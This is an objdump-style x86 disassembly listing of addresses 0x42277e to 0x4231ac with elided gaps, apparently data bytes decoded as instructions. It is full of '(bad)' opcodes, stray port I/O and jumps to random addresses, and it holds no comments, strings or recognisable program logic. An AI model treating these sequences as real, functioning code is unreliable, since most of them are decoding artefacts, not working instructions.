  42277e:	cmp    DWORD PTR [esi-0x76],0x8a9479ff
  422785:	push   DWORD PTR [ecx+0x24]
  422788:	mov    bh,bh
  42278a:	imul   esi,esp,0xc23e0000
  422790:	mov    edi,edi
  422792:	pop    ecx
  422793:	hlt    
  422794:	add    BYTE PTR [eax],al
  422796:	mov    cs,WORD PTR ds:[edx-0x7575b601]
  42279d:	inc    DWORD PTR [ecx-0xc]
  4227a0:	add    BYTE PTR [eax],al
  4227a2:	ds push esp
  4227a4:	mov    edi,?
  4227a6:	xor    DWORD PTR [eax-0x74],edx
  4227a9:	jmp    FWORD PTR [ecx]
  4227ab:	in     al,dx
  4227ac:	mov    bh,bh
  4227ae:	and    DWORD PTR [eax-0x55e60078],edi
  4227b4:	mov    bh,bh
  4227b6:	adc    DWORD PTR [esi],ebx
  4227b8:	mov    edi,edi
  4227ba:	or     esp,esi
  4227bc:	add    BYTE PTR [eax],al
  4227be:	ds (bad) 
  4227c0:	mov    bh,bh
  4227c2:	stc    
  4227c3:	(bad)  [eax-0x768e0e01]
  4227c9:	(bad)  
  4227ca:	jmp    0xe241b15a
  4227cf:	xchg   ebp,eax
  4227d0:	mov    edi,edi
  4227d2:	fld    st(3)
  4227d4:	mov    edi,edi
  4227d6:	sar    DWORD PTR [ebx-0x4a360075],1
  4227dc:	mov    edi,edi
  4227de:	sar    DWORD PTR [ebp+0xff8b],0x0
	...
  422809:	add    BYTE PTR [eax],al
  42280b:	add    BYTE PTR [ecx-0x4e007445],bh
  422811:	repz add BYTE PTR [eax],al
  422814:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422816:	mov    edi,edi
  422818:	mov    eax,ds:0x99ff89f9
  42281d:	pop    edx
  42281e:	out    0x3,eax
  422820:	ds pop ebx
  422822:	stos   DWORD PTR es:[edi],eax
  422823:	xchg   BYTE PTR [ecx-0x7e794f1f],cl
  422829:	loope  0x4227af
  42282b:	xchg   BYTE PTR [ecx-0x1f],bh
  42282e:	jp     0x4227b6
  422830:	jno    0x422813
  422832:	out    0x84,al
  422834:	imul   esp,ecx,0xe16184e2
  42283a:	rol    BYTE PTR [ecx+ebx*2+0x518510e1],1
  422841:	loope  0x422857
  422843:	test   DWORD PTR [ecx-0x1f],ecx
  422846:	stos   BYTE PTR es:[edi],al
  422847:	test   BYTE PTR [ecx-0x1f],al
  42284a:	mov    dh,0x84
  42284c:	cmp    ecx,esp
  42284e:	mov    ds:0xb8e13184,al
  422853:	test   BYTE PTR [ecx],ch
  422855:	loope  0x4228bb
  422857:	test   DWORD PTR [ecx],esp
  422859:	loope  0x4228a5
  42285b:	test   DWORD PTR [ecx],ebx
  42285d:	loope  0x4228b7
  42285f:	test   DWORD PTR [ecx],edx
  422861:	loope  0x42288b
  422863:	test   DWORD PTR [ecx],ecx
  422865:	loope  0x4228a1
  422867:	test   DWORD PTR [ecx],eax
  422869:	loope  0x42286d
  42286b:	test   ecx,edi
  42286d:	loopne 0x42286b
  42286f:	test   BYTE PTR [eax],al
	...
  422899:	add    cl,dh
  42289b:	loopne 0x422881
  42289d:	xchg   ecx,ebp
  42289f:	loopne 0x422871
  4228a1:	xchg   ecx,esp
  4228a3:	loopne 0x422863
  4228a5:	xchg   ecx,ebx
  4228a7:	loopne 0x4228cb
  4228a9:	mov    cl,dl
  4228ab:	loopne 0x4228e5
  4228ad:	mov    cl,cl
  4228af:	loopne 0x4228f9
  4228b1:	mov    cl,al
  4228b3:	loopne 0x4228f1
  4228b5:	mov    BYTE PTR [ecx-0x4e788f20],bh
  4228bb:	loopne 0x422917
  4228bd:	xchg   DWORD PTR [ecx-0x467d0020],ebp
  4228c3:	loopne 0x4228c1
  4228c5:	jae    0x422888
  4228c7:	loopne 0x4228c5
  4228c9:	mov    ch,0xb9
  4228cb:	loopne 0x4228c9
  4228cd:	rol    ecx,0xe0
  4228d0:	cld    
  4228d1:	cmp    DWORD PTR [ecx-0x3e6a0320],0xb8f1fce0
  4228db:	loopne 0x4228d9
  4228dd:	loope  0x42289f
  4228df:	loopne 0x4228dd
  4228e1:	ret    
  4228e2:	mov    eax,0xc0b3fce0
  4228e7:	loopne 0x4228e5
  4228e9:	mov    ebx,0xcffce0b8
  4228ee:	shl    al,0xfc
  4228f1:	outs   dx,DWORD PTR ds:[esi]
  4228f2:	mov    eax,0xc081fce0
  4228f7:	(bad)  
  4228f9:	sub    DWORD PTR [eax+0x21fcdf],edi
	...
  422927:	add    al,al
  422929:	(bad)  
  42292b:	dec    ebp
  42292c:	mov    eax,0xc033fcdf
  422931:	(bad)  
  422933:	repz (bad) 
  422935:	(bad)  
  422937:	sti    
  422938:	mov    bh,0xdf
  42293a:	cld    
  42293b:	shl    DWORD PTR [edi-0x382e0321],0xdf
  422942:	cld    
  422943:	scas   eax,DWORD PTR es:[edi]
  422944:	(bad)  
  422945:	(bad)  
  422947:	jmp    0x7b428489
  42294c:	mov    bh,0xdf
  42294e:	cld    
  42294f:	arpl   di,ax
  422951:	(bad)  
  422953:	mov    edi,DWORD PTR [eax-0x3f640321]
  422959:	(bad)  
  42295b:	stos   DWORD PTR es:[edi],eax
  42295c:	mov    eax,0xc0b7fcdf
  422961:	(bad)  
  422963:	add    BYTE PTR [edi-0x18ffffa5],ah
  422969:	fdivr  st,st(4)
  42296b:	call   DWORD PTR [edi-0x60ffffa5]
  422971:	fdivr  st,st(4)
  422973:	(bad)  
  422974:	aas    
  422975:	fdivr  st,st(4)
  422977:	(bad)  
  422978:	jnp    0x422952
  42297a:	cld    
  42297b:	jmp    FWORD PTR [ebp-0x28]
  42297e:	cld    
  42297f:	call   FWORD PTR [edi]
  422981:	fdivr  st,st(4)
  422983:	call   FWORD PTR [edi]
  422985:	fdivr  st,st(4)
  422987:	dec    DWORD PTR [edi-0x28]
  42298a:	cld    
  42298b:	inc    DWORD PTR [eax]
	...
  4229b5:	add    BYTE PTR [ebp-0x28],ch
  4229b8:	cld    
  4229b9:	(bad)  
  4229ba:	fst    st(7)
  4229bc:	cld    
  4229bd:	inc    edi
  4229bf:	xlat   BYTE PTR ds:[ebx]
  4229c0:	cld    
  4229c1:	jmp    DWORD PTR [edi+0x57fffcd7]
  4229c7:	pop    ebx
  4229c8:	add    BYTE PTR [eax],al
  4229ca:	pop    ecx
  4229cb:	(bad)  
  4229cc:	cld    
  4229cd:	jmp    DWORD PTR [edi]
  4229cf:	pop    ebx
  4229d0:	add    BYTE PTR [eax],al
  4229d2:	(bad)  
  4229d3:	(bad)  
  4229d4:	cld    
  4229d5:	jmp    FWORD PTR [ecx-0x2a]
  4229d8:	cld    
  4229d9:	jmp    DWORD PTR [edi]
  4229db:	pop    ebx
  4229dc:	add    BYTE PTR [eax],al
  4229de:	pop    es
  4229df:	sar    esp,cl
  4229e1:	(bad)  
  4229e2:	sti    
  4229e3:	sar    ah,cl
  4229e5:	(bad)  
  4229e6:	out    dx,eax
  4229e7:	sar    ah,cl
  4229e9:	jmp    DWORD PTR [ebx-0x5600032e]
  4229ef:	sar    ah,cl
  4229f1:	call   FWORD PTR [ebp-0x2800032e]
  4229f7:	pop    edx
  4229f8:	add    BYTE PTR [eax],al
  4229fa:	push   ebp
  4229fb:	sar    ah,cl
  4229fd:	call   FWORD PTR [ecx-0x31]
  422a00:	cld    
  422a01:	call   FWORD PTR [ecx-0x2e]
  422a04:	cld    
  422a05:	(bad)  
  422a06:	ds ins BYTE PTR es:[edi],dx
  422a08:	mov    edi,edi
  422a0a:	mov    ecx,0xb1ff88d2
  422a0f:	fs mov edi,edi
  422a12:	test   eax,0xa1ff88dc
  422a17:	mov    dl,0x88
  422a19:	inc    DWORD PTR [eax]
	...
  422a43:	add    BYTE PTR [ecx-0x6e007746],bl
  422a49:	sbb    al,0x89
  422a4b:	dec    DWORD PTR [ecx+0x3e0000f4]
  422a51:	ret    0xff88
  422a54:	jns    0x422a4c
  422a56:	mov    edi,edi
  422a58:	jno    0x422a4e
  422a5a:	add    BYTE PTR [eax],al
  422a5c:	ds lahf 
  422a5e:	add    BYTE PTR [ecx-0x14],al
  422a61:	dec    esi
  422a62:	mov    ds:0xab35e373,eax
  422a67:	imul   ebx,ebx,0xffffffb2
  422a6a:	add    BYTE PTR [edi],bh
  422a6c:	cmp    al,0xa2
  422a6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a6f:	pop    esi
  422a70:	fisubr DWORD PTR [ebp-0xb5c9455]
  422a76:	add    BYTE PTR [ecx],ah
  422a78:	ds mov cl,0xac
  422a7b:	ins    BYTE PTR es:[edi],dx
  422a7c:	lods   eax,DWORD PTR ds:[esi]
  422a7d:	pop    ss
  422a7e:	leave  
  422a7f:	pop    esi
  422a80:	nop
  422a81:	adc    BYTE PTR [ebp-0xd6c19e],ch
  422a87:	push   esp
  422a88:	mov    ebx,cs
  422a8a:	mov    ah,0x62
  422a8c:	or     bl,0xac
  422a8f:	bound  edi,QWORD PTR [esi]
  422a91:	out    0x1,eax
  422a93:	ins    BYTE PTR es:[edi],dx
  422a94:	ins    DWORD PTR es:[edi],dx
  422a95:	enter  0x6bae,0x5b
  422a99:	mov    bl,0xff
  422a9c:	jmp    0x52872ec4
  422aa1:	aad    0x9e
  422aa3:	pop    esi
  422aa4:	push   0xffffffc0
  422aa6:	lods   eax,DWORD PTR ds:[esi]
  422aa7:	pusha  
	...
  422ad0:	add    BYTE PTR [eax],al
  422ad2:	gs pop ebx
  422ad4:	out    0x3,eax
  422ad6:	xchg   ebx,eax
  422ad7:	pop    ebx
  422ad8:	es mov al,0x52
  422adb:	jns    0x422b25
  422add:	mov    al,0xc
  422adf:	ins    DWORD PTR es:[edi],dx
  422ae0:	cmp    ebp,DWORD PTR [ebp+0x3e7721e]
  422ae6:	mov    dl,0x5b
  422ae8:	sub    ebp,DWORD PTR [ebp-0x39bc83e2]
  422aee:	vmread DWORD PTR [esp+eax*1-0x72],eax
  422af3:	pop    ebx
  422af4:	xor    ebp,DWORD PTR [ebp-0x3cf483e2]
  422afa:	adc    eax,0x79a1066f
  422aff:	fucomp st(7)
  422b01:	add    dl,ah
  422b03:	imul   edi,ebx,0x6adeb1
  422b09:	ret    
  422b0a:	popa   
  422b0b:	fstp   st(1)
  422b0d:	add    dl,ch
  422b0f:	imul   esi,ebx,0xdb7bdeb1
  422b15:	ret    0xdd49
  422b18:	cmc    
  422b19:	add    bh,bl
  422b1b:	ja     0x422af8
  422b1d:	lds    esp,FWORD PTR [eax-0x523d3b91]
  422b23:	addr16 mov ecx,0xb3669faa
  422b29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b2a:	scas   al,BYTE PTR es:[edi]
  422b2b:	call   0xbba4:0x5bb503e7
  422b32:	mov    eax,ds:0xa7957a
	...
  422b5f:	add    BYTE PTR [ebp+ebp*2-0x6b],bh
  422b63:	stos   BYTE PTR es:[edi],al
  422b64:	(bad)  
  422b65:	ins    BYTE PTR es:[edi],dx
  422b66:	test   DWORD PTR [esi-0x2f6c92a4],ebp
  422b6c:	ins    DWORD PTR es:[edi],dx
  422b6d:	imul   edx,DWORD PTR [eax-0x57979d53],0x5a4203
  422b77:	scas   al,BYTE PTR es:[edi]
  422b78:	mov    al,ds:0xa1804668
  422b7d:	jns    0x422bd0
  422b7f:	push   eax
  422b80:	test   BYTE PTR [ecx+0x0],bh
  422b83:	pop    ds
  422b84:	cmp    bl,BYTE PTR [edx+0x68dd4c72]
  422b8a:	arpl   WORD PTR [edi],sp
  422b8c:	in     eax,0x70
  422b8e:	arpl   WORD PTR [ebx*8-0x2faf8f94],si
  422b95:	ja     0x422bd6
  422b97:	jmp    0x1c4486d9
  422b9c:	(bad)  [esi+edx*2+0x10]
  422ba0:	loope  0x422c09
  422ba2:	dec    ebp
  422ba3:	pop    es
  422ba4:	js     0x422c1b
  422ba6:	ins    BYTE PTR es:[edi],dx
  422ba7:	or     al,0x42
  422ba9:	or     al,BYTE PTR [edx]
  422bab:	xor    al,0xa0
  422bad:	jno    0x422c0e
  422baf:	stc    
  422bb0:	xchg   ebx,eax
  422bb1:	jne    0x422c16
  422bb3:	div    BYTE PTR [edx+0x76]
  422bb6:	inc    esi
  422bb7:	add    BYTE PTR [esi+0x3c830079],cl
  422bbd:	(bad)  
  422bbe:	ins    DWORD PTR es:[edi],dx
  422bbf:	enter  0x90a1,0x67
  422bc3:	retf   
	...
  422bec:	add    BYTE PTR [eax],al
  422bee:	(bad)  
  422bef:	jge    0x422c63
  422bf1:	sar    ah,1
  422bf3:	(bad)  
  422bf5:	mov    edx,0xbd63963c
  422bfa:	or     eax,0xfcca6d6a
  422bff:	ja     0x422c65
  422c01:	mov    ebx,0xe9716ae0
  422c06:	cmp    eax,0xe0adfed7
  422c0b:	addr16 push esp
  422c0d:	test   al,dl
  422c0f:	imul   edx,DWORD PTR [eax-0x78],0xffffffb1
  422c13:	jae    0x422c54
  422c15:	jmp    0x425457
  422c1a:	xchg   esp,eax
  422c1b:	test   eax,0xb56b6161
  422c20:	inc    eax
  422c21:	imul   edx,DWORD PTR [ebp-0x4b],0xaa50745f
  422c28:	jne    0x422c6b
  422c2a:	xlat   BYTE PTR ds:[ebx]
  422c2b:	push   edi
  422c2c:	add    BYTE PTR gs:[ebx],bl
  422c2f:	mov    edx,0xba1b6568
  422c34:	inc    edx
  422c35:	imul   esi,DWORD PTR [ebx-0x46],0x5697003d
  422c3c:	inc    ebx
  422c3d:	imul   edx,DWORD PTR gs:[edx+esi*2],0x72
  422c42:	push   ebp
  422c43:	mov    edx,0xa537746a
  422c48:	imul   esp,DWORD PTR [ebx+0x3a],0xffffffa4
  422c4c:	outs   dx,DWORD PTR ds:[esi]
  422c4d:	add    BYTE PTR [edi+0x695354],ah
	...
  422c7b:	add    BYTE PTR [ebx-0x46],cl
  422c7e:	aas    
  422c7f:	push   0x6f50a546
  422c84:	xor    ch,BYTE PTR [edx+0x154e7468]
  422c8a:	jbe    0x422d00
  422c8c:	dec    edx
  422c8d:	push   edi
  422c8e:	sub    BYTE PTR [ecx],al
  422c90:	sbb    BYTE PTR [edx-0x5b89b390],bh
  422c96:	jo     0x422cdd
  422c98:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422c9a:	imul   esi,DWORD PTR [edx+0x27],0x5f
  422c9e:	adc    DWORD PTR [ebx],eax
  422ca0:	repz adc DWORD PTR [ecx+0x72],esi
  422ca4:	hlt    
  422ca5:	add    ebp,DWORD PTR [ebp+0x41]
  422ca8:	pop    ss
  422ca9:	pop    edi
  422caa:	push   ebp
  422cab:	add    ah,ah
  422cad:	adc    BYTE PTR [edx+0x61],ah
  422cb0:	retf   
  422cb1:	sti    
  422cb2:	push   eax
  422cb3:	outs   dx,DWORD PTR ds:[esi]
  422cb4:	mov    al,0x2
  422cb6:	gs gs mov bl,0xe
  422cba:	xor    BYTE PTR [edx],dh
  422cbc:	ds adc eax,0xf56e5ea7
  422cc2:	test   al,0x6c
  422cc4:	jb     0x422c8a
  422cc6:	add    BYTE PTR [ebx],ah
  422cc8:	cmp    al,0xf4
  422cca:	mov    dl,0x6c
  422ccc:	pop    ebp
  422ccd:	out    0xb5,eax
  422ccf:	jo     0x422cde
  422cd1:	push   ss
  422cd2:	mov    edi,0xb0354c66
  422cd7:	inc    ecx
  422cd9:	pop    esp
  422cda:	push   es
  422cdb:	dec    ebp
  422cdc:	cs daa 
  422cde:	stos   BYTE PTR es:[edi],al
  422cdf:	dec    edi
	...
  422d08:	add    BYTE PTR [eax],al
  422d0a:	sub    al,0x99
  422d0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422d0d:	bound  ebp,QWORD PTR ds:0x3c250495
  422d13:	je     0x422ccb
  422d15:	ins    BYTE PTR es:[edi],dx
  422d16:	sbb    eax,0x4d70b527
  422d1b:	(bad)  
  422d1c:	(bad)  
  422d1d:	bound  eax,QWORD PTR [esi]
  422d1f:	js     0x422d25
  422d21:	scas   eax,DWORD PTR es:[edi]
  422d22:	sub    BYTE PTR ds:[ebx-0x54761d93],0x71
  422d2a:	in     eax,dx
  422d2b:	outs   dx,DWORD PTR ds:[esi]
  422d2c:	ret    0xda66
  422d2f:	retw   
  422d31:	jmp    DWORD PTR [ecx-0x4f]
  422d34:	add    eax,0xb2d7cd6c
  422d39:	pusha  
  422d3a:	jecxz  0x422d0f
  422d3c:	stos   DWORD PTR es:[edi],eax
  422d3d:	ds inc BYTE PTR ds:[eax]
  422d41:	inc    esi
  422d42:	xlat   BYTE PTR ds:[ebx]
  422d43:	test   eax,0xaca34d9c
  422d48:	lods   al,BYTE PTR ds:[esi]
  422d49:	inc    ebp
  422d4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d4b:	sbb    BYTE PTR [eax+0xef3e3e],ah
  422d51:	inc    esi
  422d52:	xchg   edi,eax
  422d53:	stos   BYTE PTR es:[edi],al
  422d54:	pushf  
  422d55:	inc    eax
  422d56:	stos   BYTE PTR es:[edi],al
  422d57:	mov    eax,ds:0xd03e62b5
  422d5c:	add    eax,DWORD PTR [ebp-0x5d]
  422d5f:	pop    ebx
  422d60:	fwait
  422d61:	enter  0x3f92,0x94
  422d65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422d66:	pop    esp
  422d67:	and    ecx,DWORD PTR [eax-0x7bb8a257]
  422d6d:	les    eax,FWORD PTR [eax]
	...
  422d97:	add    cl,ch
  422d99:	fstp   DWORD PTR [esp+eax*1+0x7b]
  422d9d:	inc    eax
  422d9e:	jae    0x422d71
  422da0:	pop    esp
  422da1:	dec    ebp
  422da2:	jp     0x422d50
  422da4:	bound  ecx,QWORD PTR [ecx-0x5c]
  422da7:	mov    ebx,0x3115b08
  422dac:	jnp    0x422dee
  422dae:	push   ebx
  422daf:	enter  0x3e2a,0x48
  422db3:	test   al,0x1c
  422db5:	and    al,0x3d
  422db7:	mov    ds:0x3e71c1a,al
  422dbc:	sub    bl,BYTE PTR [esi+eiz*1-0x61]
  422dc0:	or     eax,0xdb5302e
  422dc5:	inc    eax
  422dc6:	cmp    al,0xcb
  422dc8:	sbb    eax,DWORD PTR [ecx+0x16]
  422dcb:	add    al,0xde
  422dcd:	pop    ebx
  422dce:	es lahf 
  422dd0:	in     eax,dx
  422dd1:	xor    DWORD PTR [eax],eax
  422dd3:	stos   BYTE PTR es:[edi],al
  422dd4:	fisttp QWORD PTR [ecx+0x16]
  422dd7:	mov    ch,0xfd
  422dd9:	inc    ebx
  422dda:	stc    
  422ddb:	sahf   
  422ddc:	fimul  WORD PTR [esi+0xe]
  422ddf:	mov    dh,0xd0
  422de1:	sbb    esp,edi
  422de3:	add    eax,DWORD PTR [ebx]
  422de5:	pop    esp
  422de6:	es lahf 
  422de8:	int    0x2a
  422dea:	fldcw  WORD PTR [edx-0x612cc435]
  422df0:	mov    DWORD PTR [ebp-0x3a],ecx
  422df3:	mov    eax,ds:0xd4c44798
  422df8:	lods   eax,DWORD PTR ds:[esi]
  422df9:	dec    ebp
  422dfa:	shr    BYTE PTR [ecx+0x0],1
	...
  422e24:	add    BYTE PTR [eax],al
  422e26:	call   0x5d:0x9403e71a
  422e2d:	call   0x4ad3:0xb4414cb0
  422e34:	arpl   WORD PTR [edi-0x6498e32f],dx
  422e3a:	fdivr  DWORD PTR [ebx]
  422e3c:	je     0x422dc4
  422e3e:	stos   DWORD PTR es:[edi],eax
  422e3f:	push   ecx
  422e40:	aas    
  422e41:	jmp    0xae415583
  422e46:	ror    BYTE PTR [eax+edx*2+0x7b],0xa4
  422e4b:	dec    esi
  422e4c:	pop    edi
  422e4d:	jge    0x422dff
  422e4f:	sub    BYTE PTR [edx+0x7e],dh
  422e52:	lahf   
  422e53:	inc    ecx
  422e54:	ins    BYTE PTR es:[edi],dx
  422e55:	dec    esp
  422e56:	jmp    0x422e95
  422e58:	popa   
  422e59:	push   ebp
  422e5a:	in     eax,0x47
  422e5c:	outs   dx,BYTE PTR ds:[esi]
  422e5d:	daa    
  422e5e:	fld    QWORD PTR [ebp+0x63]
  422e61:	pop    edx
  422e62:	jge    0x422e3c
  422e64:	cld    
  422e65:	xor    BYTE PTR ds:0x7235631e,bh
  422e6b:	dec    edx
  422e6c:	addr16 aas 
  422e6e:	fisttp QWORD PTR [ebx+eiz*2+0x19]
  422e72:	rol    BYTE PTR [edi+0x66],1
  422e75:	adc    dh,dl
  422e77:	cmp    eax,0x99ae0f47
  422e7c:	add    BYTE PTR [edi+0x15631e3d],dl
  422e82:	or     DWORD PTR [ebp+0x72],0xfffffffb
  422e86:	rol    BYTE PTR [esi+0x74],0x25
	...
  422eb2:	add    BYTE PTR [eax],al
  422eb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422eb5:	dec    edx
  422eb6:	arpl   WORD PTR [edx],cx
  422eb8:	mov    es,WORD PTR [edi+0x72]
  422ebb:	lock jl 0x422e96
  422ebe:	cld    
  422ebf:	pop    es
  422ec0:	cmp    eax,DWORD PTR [edi+0x71]
  422ec3:	aad    0xf3
  422ec5:	inc    ebx
  422ec6:	arpl   di,ax
  422ec8:	push   cs
  422ec9:	fdivr  st,st(4)
  422ecb:	fadd   QWORD PTR [ebx+0x24]
  422ece:	jae    0x422ed0
  422ed0:	or     ecx,DWORD PTR [eax]
  422ed2:	inc    dx
  422ed4:	inc    BYTE PTR [edi]
  422ed6:	bound  edx,QWORD PTR [eax+edi*8-0x56]
  422eda:	gs add bl,BYTE PTR fs:[edi+0x5ba56164]
  422ee2:	mov    DWORD PTR [ecx],eax
  422ee4:	mov    al,ds:0xbe5470f8
  422ee9:	(bad)  
  422eea:	addr16 inc ebx
  422eec:	push   0xd7746b09
  422ef1:	pop    ebx
  422ef2:	mov    bh,0x2
  422ef4:	mov    ah,0xff
  422ef6:	popa   
  422ef7:	gs push edi
  422ef9:	pop    esp
  422efa:	xor    al,BYTE PTR [ecx]
  422efc:	mov    al,ds:0x684d70f8
  422f01:	sti    
  422f02:	jno    0x422f70
  422f04:	add    bl,BYTE PTR [ecx]
  422f06:	data16 ins BYTE PTR es:[edi],dx
  422f08:	add    ah,BYTE PTR [ecx-0x61fd92a3]
  422f0e:	cld    
  422f0f:	push   DWORD PTR [eax+0x5d]
  422f12:	dec    esp
  422f13:	inc    ebx
  422f14:	push   0xfffffffe
  422f16:	ins    BYTE PTR es:[edi],dx
  422f17:	push   ebx
	...
  422f40:	add    BYTE PTR [eax],al
  422f42:	push   ebx
  422f43:	or     eax,0x9e006e66
  422f48:	cld    
  422f49:	(bad)  
  422f4a:	mov    esp,0x4e78415e
  422f4f:	or     ecx,DWORD PTR [ebp+0x72]
  422f52:	cmp    ah,bh
  422f54:	popa   
  422f55:	jae    0x422f9b
  422f57:	pop    edi
  422f58:	lods   eax,DWORD PTR ds:[esi]
  422f59:	add    al,BYTE PTR [edx+edi*8+0x70]
  422f5d:	push   ebp
  422f5e:	dec    ecx
  422f5f:	pop    es
  422f60:	pop    esi
  422f61:	outs   dx,BYTE PTR ds:[esi]
  422f62:	inc    ebx
  422f63:	add    esp,DWORD PTR [edx+0x64]
  422f66:	and    dl,BYTE PTR [edi]
  422f68:	pusha  
  422f69:	gs addr16 pop es
  422f6c:	outs   dx,WORD PTR ds:[esi]
  422f6e:	or     DWORD PTR [ecx],ebx
  422f70:	data16 ins BYTE PTR es:[edi],dx
  422f72:	ds mov eax,0x993e719f
  422f78:	lahf   
  422f79:	jno    0x422f0b
  422f7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f7d:	xor    BYTE PTR [esi+eiz*2-0x60],cl
  422f81:	imul   esp,DWORD PTR [edx+0x3e8900c4],0x1
  422f88:	scas   eax,DWORD PTR es:[edi]
  422f89:	bound  ebx,QWORD PTR [edi+0x72509ff8]
  422f8f:	repnz lahf 
  422f91:	pop    esi
  422f92:	arpl   bp,di
  422f94:	mov    ds:0xa6588147,al
  422f99:	popa   
  422f9a:	pop    edi
  422f9b:	lock add BYTE PTR [ebp+0x739ffd3e],dl
  422fa2:	xchg   BYTE PTR ds:0x6ca5,al
	...
  422fd0:	pop    esp
  422fd1:	jecxz  0x422f77
  422fd3:	inc    ebp
  422fd4:	dec    esp
  422fd5:	sub    eax,0x323250a7
  422fda:	lahf   
  422fdb:	pop    esi
  422fdc:	and    eax,esp
  422fde:	add    BYTE PTR [esi],cl
  422fe0:	and    DWORD PTR ds:[ebp-0x5cd8d3c0],0xaf7d2373
  422feb:	data16 sbb al,ah
  422fee:	add    BYTE PTR [eax+0x3e],ah
  422ff1:	and    DWORD PTR [ebp-0x568ee0ad],0xbe66e34a
  422ffb:	jno    0x422fd8
  422ffd:	data16 add al,0xd
  423000:	and    DWORD PTR ds:[ebp-0x5c9913c0],0xa68ae373
  42300b:	jo     0x422fd7
  42300d:	bound  esp,QWORD PTR [esi+0xc3e360]
  423013:	icebp  
  423014:	ds pop ebx
  423016:	mov    dh,0xa7
  423018:	pushf  
  423019:	and    al,0xcd
  42301b:	lods   al,BYTE PTR ds:[esi]
  42301c:	lods   eax,DWORD PTR ds:[esi]
  42301d:	inc    esp
  42301e:	enter  0xa0a7,0x51
  423022:	les    eax,FWORD PTR [ebx]
  423024:	xchg   ebx,eax
  423025:	inc    edi
  423026:	int3   
  423027:	repnz dec edi
  423029:	test   ebx,eax
  42302b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42302c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42302d:	pop    ebx
  42302e:	mov    ah,0x1
  423030:	xchg   ebx,eax
  423031:	dec    edx
  423032:	mov    bh,0xb1
	...
  42305c:	add    BYTE PTR [eax],al
  42305e:	cwde   
  42305f:	inc    ebp
  423060:	fwait
  423061:	popf   
  423062:	cmp    BYTE PTR [ebx-0x6c],bl
  423065:	mov    dl,0x5c
  423067:	dec    ecx
  423068:	(bad)  
  42306a:	sbb    edi,DWORD PTR [edi]
  42306c:	jnp    0x423015
  42306e:	loope  0x423045
  423070:	push   ss
  423071:	add    al,0x6c
  423073:	inc    eax
  423074:	xchg   dh,al
  423076:	popa   
  423077:	inc    eax
  423078:	test   edx,ecx
  42307a:	pop    esp
  42307b:	push   esp
  42307c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42307d:	mov    ebx,0x3c15b00
  423082:	or     al,0x40
  423084:	inc    esi
  423085:	shr    DWORD PTR [eax+eax*2],cl
  423088:	pop    ecx
  423089:	mov    ebx,0xaf3b3c13
  42308e:	sbb    al,0x20
  423090:	aas    
  423091:	ret    
  423092:	cdq    
  423093:	aad    0x75
  423095:	add    ebp,esp
  423097:	aas    
  423098:	dec    esi
  423099:	rcl    DWORD PTR ds:0xf69f3a46,0x3f
  4230a0:	and    BYTE PTR [ebx+ecx*4],al
  4230a3:	pop    ebx
  4230a4:	cmp    DWORD PTR [edi-0x60e8da26],ebx
  4230aa:	(bad)  [ecx]
  4230ac:	add    al,0xbb
  4230ae:	and    BYTE PTR [ebx-0x55],bl
  4230b1:	add    ebp,esp
  4230b3:	aas    
  4230b4:	push   es
  4230b5:	mov    edi,0x4004fe3
  4230ba:	ja     0x4230f4
  4230bc:	ja     0x4230e2
  4230be:	adc    BYTE PTR [eax+eax*1+0xa3],0x0
	...
  4230ea:	add    BYTE PTR [eax],al
  4230ec:	cmp    eax,0xfec66329
  4230f1:	dec    edx
  4230f2:	arpl   ax,cx
  4230f4:	fnstcw WORD PTR [ecx]
  4230f6:	dec    ecx
  4230f7:	(bad)  
  4230f8:	in     al,0x95
  4230fa:	add    BYTE PTR [esi+0x3d],cl
  4230fd:	sub    DWORD PTR [ebx-0x3a],esp
  423100:	out    dx,al
  423101:	cmp    DWORD PTR [edi+ebx*4-0x24],esi
  423105:	inc    eax
  423106:	jae    0x4230cc
  423108:	ror    BYTE PTR [edi+edi*1-0x17],0x3d
  42310d:	cmp    bh,0xaf
  423110:	scas   al,BYTE PTR es:[edi]
  423111:	sub    BYTE PTR [ebx-0x6f],ah
  423114:	cdq    
  423115:	sub    DWORD PTR [esi-0x80],ebp
  423118:	sahf   
  423119:	inc    edi
  42311a:	mov    WORD PTR fs:0xb09afea5,?
  423121:	aas    
  423122:	dec    ebp
  423123:	jns    0x4230cd
  423125:	inc    esi
  423126:	inc    ecx
  423127:	je     0x4230b8
  423129:	dec    edx
  42312a:	arpl   WORD PTR [edi-0x12],dx
  42312d:	sub    DWORD PTR [ecx+0x44],esi
  423130:	in     al,dx
  423131:	aam    0xfc
  423133:	scas   al,BYTE PTR es:[edi]
  423134:	cmp    al,0x29
  423136:	arpl   WORD PTR [esi-0x1f],ax
  423139:	inc    esi
  42313a:	jae    0x423190
  42313c:	mov    BYTE PTR ds:0x95b1346c,dh
  423142:	add    dl,dl
  423144:	cmp    al,0x1e
  423146:	arpl   WORD PTR ds:0x1b634b71,si
  42314c:	xor    BYTE PTR ds:0x46b,0x0
	...
  423177:	add    BYTE PTR [eax],al
  423179:	add    BYTE PTR [ebp-0x2c],bh
  42317c:	cld    
  42317d:	or     BYTE PTR [esi-0x6ae6a0b2],bl
  423183:	mov    esi,DWORD PTR [edx]
  423185:	add    BYTE PTR [ecx-0xc],dh
  423188:	push   0xd558676c
  42318d:	add    BYTE PTR [edi+eax*1],ah
  423190:	bound  ebp,QWORD PTR [ebx+eax*2+0x15]
  423194:	jne    0x4231fb
  423196:	add    al,0x5
  423198:	jno    0x4231ff
  42319a:	out    0x57,al
  42319c:	outs   dx,DWORD PTR ds:[esi]
  42319d:	push   0x3368fbfa
  4231a2:	inc    ebp
  4231a3:	mov    ebp,0x57f36c60
  4231a8:	jne    0x4231aa
  4231aa:	into   
  4231ab:	std    
  4231ac:	jo     0x423213
